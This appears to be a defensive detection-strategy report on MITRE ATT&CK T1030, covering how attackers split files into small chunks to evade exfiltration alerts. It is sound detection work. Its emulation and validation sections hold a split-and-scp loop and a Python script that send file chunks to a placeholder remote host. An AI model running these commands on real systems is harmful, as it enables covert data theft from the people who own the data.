# Alerting & Detection Strategy (ADS) Report: Data Transfer Size Limits

## Goal
The goal of this technique is to detect adversarial attempts to bypass security monitoring by limiting data transfer sizes during exfiltration activities. This method aims to identify when adversaries are splitting large files into smaller chunks to evade detection mechanisms that trigger on larger transfers.

## Categorization
- **MITRE ATT&CK Mapping:** T1030 - Data Transfer Size Limits
- **Tactic / Kill Chain Phases:** Exfiltration
- **Platforms:** Linux, macOS, Windows  
  [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1030)

## Strategy Abstract
The detection strategy leverages network traffic analysis to identify patterns indicative of small-file transfer methods. By monitoring data size and frequency over the network, this approach seeks out anomalies where a high number of small files are transferred within short periods. Data sources include network packet captures (PCAPs) and flow data from intrusion detection systems (IDS), focusing on repeated connections that fit the suspicious profile.

## Technical Context
Adversaries implement data transfer size limits by breaking down large datasets into smaller, less noticeable chunks to avoid triggering alerts based on file size thresholds. In real-world scenarios, they may use scripts or tools such as `scp`, `rsync`, or custom utilities to automate these transfers in a manner that mimics legitimate traffic.

### Adversary Emulation Details
- **Sample Commands:**
  - Using `scp`:  
    ```bash
    split --bytes=1M largefile.dat part_
    for file in part_*; do scp $file user@target:/destination/; done
    ```
  - Using Python script to automate the process:
    ```python
    import os

    def split_and_transfer(file_name, chunk_size, target):
        if not os.path.exists('parts'):
            os.mkdir('parts')
        
        # Split file
        os.system(f'split -b {chunk_size} {file_name} parts/')
        
        # Transfer each part
        for part in os.listdir('parts'):
            os.system(f'scp parts/{part} {target}')
            
    split_and_transfer('largefile.dat', '1M', 'user@target:/destination/')

## Blind Spots and Assumptions
- **Limitations:** The technique may not detect transfers that are optimally sized to mimic normal traffic patterns, especially in environments with high baseline data transfer activities.
- **Assumptions:** Assumes the network monitoring setup can capture granular details of file sizes and connection attempts.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate large-scale backup operations split into smaller parts for efficiency.
- Distributed computing tasks involving frequent small data exchanges, such as MapReduce jobs.
- Regular updates or patches downloaded in segments by legitimate software applications.

## Priority
**Severity:** High  
**Justification:** The use of small-file transfer techniques can enable adversaries to exfiltrate large amounts of sensitive data undetected. This tactic is critical in environments with high-value information assets, as it directly impacts data integrity and confidentiality.

## Validation (Adversary Emulation)
### Step-by-Step Instructions:

1. **Setup Test Environment:**
   - Establish a controlled network environment with monitoring tools like Wireshark for packet capture and Snort for IDS.
   
2. **Data Transfer Size Limits:**
   - Create a large file, `largefile.dat`, on the attacker machine.
   - Use the following command to split and transfer it:
     ```bash
     split --bytes=1M largefile.dat part_
     for file in part_*; do scp $file user@target:/destination/; done
     ```

3. **Network-Based Data Transfer in Small Chunks:**
   - Execute a Python script as shown above to automate the process of splitting and transferring data.

4. **Monitoring and Analysis:**
   - Capture network traffic during the test.
   - Analyze for multiple small file transfers originating from the same source over a short period.

## Response
When an alert is triggered by this strategy:
- Immediately investigate the source of the transfers to determine their legitimacy.
- Verify with system administrators or relevant personnel if any known legitimate operations match the pattern detected.
- If confirmed as malicious, isolate the involved endpoints and begin incident response procedures including forensic analysis and potential data recovery efforts.

## Additional Resources
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Network Monitoring Tools](https://www.wireshark.org/)  
  _Note: No additional specific resources available for this ADS._

This report provides a comprehensive framework to detect the use of data transfer size limits as part of adversarial exfiltration techniques. It outlines detection strategies, potential blind spots, and necessary response protocols to manage such threats effectively.